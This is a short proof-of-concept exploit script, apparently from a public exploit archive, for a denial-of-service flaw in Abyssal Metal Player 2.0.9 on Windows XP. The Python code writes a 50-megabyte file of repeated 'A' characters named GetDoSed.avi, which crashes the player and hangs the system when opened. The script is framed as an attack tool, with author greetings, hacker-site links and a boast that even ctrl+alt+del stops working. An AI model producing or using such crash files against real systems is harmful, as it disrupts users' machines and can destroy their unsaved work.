# Exploit Title: Abyssal Metal Player 2.0.9 DoS
# Date: 23/08/2010
# Author: 41.w4r10r
# Version: 2.0.9

#Tested on : Windows XP SP2 Eng
# Software Link: http://www.abyssalsoft.com/files/download.php?id=15

#!/usr/bin/python
#Abyssal Metal Player is Media File Player which Plays many Media Files such as .Mp3 , .avi, .mov, .mpg, .wav.
# This vulnerability is found in playing avi file format.
print "--------------------Exploit By 41.w4r10r------------------------------\n"
print "-------------------41.w4r10r@gmail.com-----------------------------\n"
print "----------------Abyssal Metal Player 2.0.9------------------------------\n"
print "-------------Vendor Site : www.abyssalsoft.com-------------------------\n"
print "-------------Tested on Windows XP Sp2 Eng--------------------\n"
print "Greets:B0nd, nEo, Godwin_Austin, Fb1H2s, Eberly, Punter, The_Empty(), DZZ, Micr0 \n \n"
print "  Catch Us :  www.Garahe4hackers.com | www.Andhrahackers.com | www.ICW.in \n \n"

print "Give Me 10Sec To create file :) \n"
junk = "A" * 50000000;
filename = "GetDoSed.avi";
file = open(filename,"w")
file.writelines(junk)
file.close()
print "File Is created"
print "open file in player then press ok when asked now even ctrl+alt+del will not work"
print "Recomandation : Save all working Data b4 launching exploit :P"
print "Press Any Key To Continue........."

raw_input()